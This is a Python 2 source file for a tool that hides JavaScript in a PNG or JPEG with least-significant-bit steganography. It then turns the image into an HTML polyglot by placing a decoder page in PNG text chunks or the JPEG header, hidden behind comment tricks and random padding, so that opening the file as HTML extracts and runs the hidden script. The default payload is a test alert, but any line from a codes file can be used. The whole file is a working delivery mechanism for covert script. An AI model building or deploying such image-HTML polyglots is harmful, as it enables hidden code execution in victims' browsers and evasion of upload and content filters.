import sys
import argparse
from PIL import Image
from PIL import PngImagePlugin
import binascii
import string
import random
import math

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

parser = argparse.ArgumentParser(description='Hide your code in png or jpeg image, then create an html+image autoexecution')
parser.add_argument("-i", "--image", action="store", dest="image", help="Image name", required=True)
parser.add_argument("-b", "--bitlayer", action="store", dest="bitlayer", help="Bit Layer", required=True)
parser.add_argument("-o", "--outimage", action="store", dest="outimage", help="Output image name", required=True)
args = parser.parse_args()

def set_tollerance():
	global tollerance
	if bL < 2:
		tollerance=0
	elif bL == 2:
		tollerance=1
	else:
		tollerance=3

def find_possible_rgb(bl):
	global arr_0
	global arr_1
	len_groups = pow(2, bL)
	control=0
	for i in range(256):
		if int(bin(i)[2:].zfill(8)[7-bl]) == 0:
			if control >= tollerance and control <= len_groups - tollerance - 1:
				arr_0.append(i)
			control += 1
			if control%len_groups==0:
				control=0
	control=0
	for i in range(256):
		if int(bin(i)[2:].zfill(8)[7-bl]) == 1:
			if control >= tollerance and control <= len_groups - tollerance - 1:
				arr_1.append(i)
			control += 1
			if control%len_groups==0:
				control=0

def nearest_rgb(bit,val):
	if bit==0:
		if val in arr_0:
			return val
		else:
			current = val
			for x in range(1,len(arr_0)):
				if current + x in arr_0:
					return current + x
				elif current - x in arr_0:
					return current - x
			return int(arr_0[random.randrange(len(arr_0)-1)])
	elif bit==1:
		if val in arr_1:
			return val
		else:
			current = val
			for x in range(1,len(arr_1)):
				if current + x in arr_1:
					return current + x
				elif current - x in arr_1:
					return current - x
			return int(arr_1[random.randrange(len(arr_1)-1)])

def average_2_arr(arr1,arr2):
	res = 0
	total_res = 0
	for x in range(len(arr1)):
		if x%3==0:
			total_res += (res/255)
			res = 0
		res+= math.fabs(arr1[x]-arr2[x])
	return total_res/(len(arr1)/3)

def set_bit_png(v, index, x):
	mask = 1 << index
	v &= ~mask
	if int(x)==1:
		v |= mask
	return v

def set_bit(t, rgb, bl, message_bit):
	if t=="JPEG":
		if message_bit=="0":
			return nearest_rgb(0, rgb)
		elif message_bit=="1":
			return nearest_rgb(1, rgb)
	elif t=="PNG":
		return set_bit_png(rgb, bl, message_bit)

def text_to_bits_array(chars):
    return [bin(ord(x))[2:].rjust(8,"0") for x in chars]

def text_from_bits(bits, encoding='utf-8', errors='surrogatepass'):
    n = int(bits, 2)
    return int2bytes(n).decode(encoding, errors)

def int2bytes(i):
    hex_string = '%x' % i
    n = len(hex_string)
    return binascii.unhexlify(hex_string.zfill(n + (n & 1)))

def adjust_alpha():
	img = Image.open(args.image)
	img = img.copy()
	width, height = img.size
	for row in range(height):
		for col in range(width):
			(r, g, b) = img.getpixel((col, row))
			img.putpixel((col, row), (r, g, b, 255))
	img.save(args.outimage, subsampling=0, quality=100)
	print bcolors.OKBLUE+"[+] ALPHA ADJUSTED"+bcolors.ENDC


def hide(input_image_file):
	global arr_original_pixel
	global arr_last_modified_pixel
	global modified_pixel
	modified_pixel = 0
	arr_last_modified_pixel = []
	img = Image.open(input_image_file)
	filetype = ext
	encoded = img.copy()
	width, height = img.size
	index = 0

	message_bits = "".join(text_to_bits_array(message))

	npixels = width * height
	if len(message_bits) > npixels * 3:
	    raise Exception("""Il messaggio che vuoi inserire e'
	    	troppo lungo per l'immagine scelta (%s > %s).""" % (len(message_bits), npixels * 3))

	for row in range(height):
	    for col in range(width):
	        if index + 1 <= len(message_bits):
				modified_pixel += 1
				(r, g, b) = img.getpixel((col, row))
				if trying == 1:
					arr_original_pixel.append(r)
					arr_original_pixel.append(g)
					arr_original_pixel.append(b)
				r = set_bit(filetype, r, bL, message_bits[index])
				if index + 2 <= len(message_bits):
					g = set_bit(filetype, g, bL, message_bits[index+1])
				if index + 3 <= len(message_bits):
					b = set_bit(filetype, b, bL, message_bits[index+2])
				encoded.putpixel((col, row), (r, g, b))
				arr_last_modified_pixel.append(r)
				arr_last_modified_pixel.append(g)
				arr_last_modified_pixel.append(b)
	        index += 3
	return encoded

def space(string,every):
    new_str = ""
    str_len = len(string)
    for c in range(str_len):
        if c%every==0:
            new_str += " "
        new_str += string[c]
    return new_str[1:]


def decode(image):
    img = Image.open(image)
    width, height = img.size
    message_bits = "".join(text_to_bits_array(message))
    decoded = []
    control = 0
    for row in range(height):
        for col in range(width):
            (r, g, b) = img.getpixel((col, row))
            decoded.append(bin(r)[2:].zfill(8)[7-bL])
            control +=1
            if control >= len(message_bits):
                return "".join(decoded)
            decoded.append(bin(g)[2:].zfill(8)[7-bL])
            control += 1
            if control >= len(message_bits):
                return "".join(decoded)
            decoded.append(bin(b)[2:].zfill(8)[7-bL])
            control += 1
            if control >= len(message_bits):
                return "".join(decoded)

def compare(str1,str2):
    arr = []
    if len(str1)==len(str2):
        for i in range(len(str2)):
            if str1[i]==str2[i]:
                arr.append(str2[i])
            else:
                arr.append(bcolors.WARNING+str2[i]+bcolors.ENDC)
    return arr

def encode(image):
	global trying
	trying += 1
	steg = hide(image)
	steg.save(args.outimage, subsampling=0, quality=100)
	#print "ENCODED: "+"".join(text_to_bits_array(message))
	#print "DECODED: "+"".join(compare("".join(text_to_bits_array(message)),decode(args.outimage)))
	#print "PASS   : "+str(trying)+"\n"
	if decode(args.outimage) != "".join(text_to_bits_array(message)):
	    return encode(args.outimage)
	else:
	    print bcolors.OKBLUE+"[+] ENCODED SUCCESSFULLY"+bcolors.ENDC
	    print bcolors.OKGREEN+"[ ] FORMAT: "+ext+bcolors.ENDC
	    print bcolors.OKGREEN+"[ ] LAYER : "+args.bitlayer+bcolors.ENDC
	    print bcolors.OKGREEN+"[ ] MODIFIED PIXEL:"+str(modified_pixel)+bcolors.ENDC
	    print bcolors.OKGREEN+"[ ] DIFFERENCE: "+str(average_2_arr(arr_original_pixel,arr_last_modified_pixel)*100)+"%"+bcolors.ENDC
	    if ext == "PNG":
	        html_in_png()
	        print bcolors.OKBLUE+"[+] PNG OUTPUT IMAGE READY -> output\n"+bcolors.ENDC
	    elif ext == "JPEG":
	    	html_in_jpg()
	    	print bcolors.OKBLUE+"[+] JPG OUTPUT IMAGE READY -> output\n"+bcolors.ENDC

def html_in_png():
    html_file = open("decoder_simple.html","r")
    html_data = html_file.read().replace('\n', '').replace('\r', '')
    
    html_data = html_data.replace('bL=0','bL='+str(bL))
    html_data = html_data.replace('message_len=0','message_len='+str(message_len))
    
    html_data = " -->" + html_data + "<script type='text/undefined'>/*"
    html_file.close()

    padding_length = random.randrange(1900);
    for i in range(padding_length):
    	while(1):
    		x = random.randrange(255);
        	if x >= 32 and x != 0 and x != ord('<') and x != ord('>') and x != ord('/'):
        		break
        html_data = chr(x) + html_data;

    meta = PngImagePlugin.PngInfo()
    meta.add_text("<html>", "<!--")
    meta.add_text("_",html_data)

    i = Image.open(args.outimage)
    i.save("output", "png", pnginfo=meta)

def html_in_jpg():
	in_file = open(args.outimage,"rb")
	r = in_file.read()
	in_file.close()

	html_file = open("decoder_simple.html","rb")
	html_data = html_file.read().replace('\n', '').replace('\r', '')
	html_data = html_data.replace('bL=0','bL='+str(bL))
	html_data = html_data.replace('message_len=0','message_len='+str(message_len))
	html_file.close()

	jpg_start = r[0:4]
	jfif_app0 = r[6:20]
	rest_of_jpg = r[20:]

	html = "<html><!-- ";
	content = " -->";

	content += html_data + "<!--";

	padding_length = 0x2f2a - len(content) - len(html); #12074 = 0x2f2a = /*

	random_length = random.randrange(1900);

	padding = "";
	for i in range(padding_length):
		while(1):
			x = random.randrange(255)
			if x != 0 and x != ord('<') and x != ord('>') and x != ord('/'): #verifico che il char generato sia diverso da 0,<,>,/ in quanto potrebbe commentare parte del codice essenziale
				break
	   	padding += chr(x)

	pre_padding = padding[0:random_length]
	post_padding = padding[random_length:]

	final_content = html + pre_padding + content + post_padding;

	new_jpg = jpg_start + "/*" + jfif_app0 + final_content + rest_of_jpg + "*/ -->";

	out_file = open("output","wb")
	out_file.write(new_jpg)
	out_file.close()

def select_code(file):
	global message
	global message_len
	fp = open(file,"r")
	lines = fp.read().splitlines()
	if len(lines)>0:
		print bcolors.OKGREEN+"\n[ ] SELECT CODE"+bcolors.ENDC
		for l in range(len(lines)):
			print str(l)+") "+lines[l]
		select = raw_input(": ")
		try:
			message = lines[int(select)]
			message_len = len(message)
		except:
			print bcolors.WARNING+"[-] WRONG CHOICE - USE DEFAULT CODE"+bcolors.ENDC
		print "\n"
	else:
		print bcolors.WARNING+"[-] FILE OF CODES IS EMPTY - USE DEFAULT CODE\n"+bcolors.ENDC

if __name__ == "__main__":
	message = "alert('work');//"
	message_len = len(message)
	trying = 0
	bL = int(args.bitlayer)
	modified_pixel = 0
	arr_original_pixel = []
	arr_last_modified_pixel = []
	print bcolors.OKGREEN+"\n[ ] STARTED..."+bcolors.ENDC
	ext3 = args.outimage[len(args.outimage)-3:len(args.outimage)]
	ext4 = args.outimage[len(args.outimage)-4:len(args.outimage)]
	ext = ""
	if ext3=="JPG" or ext3=="jpg" or ext4=="JPEG" or ext4=="jpeg":
		ext = "JPEG"
		arr_0 = []
		arr_1 = []
		tollerance = 0
		set_tollerance()
		find_possible_rgb(bL)
	elif ext3=="png" or ext3=="PNG":
		ext = "PNG"
		adjust_alpha()
	select_code("codes.txt")
	encode(args.image)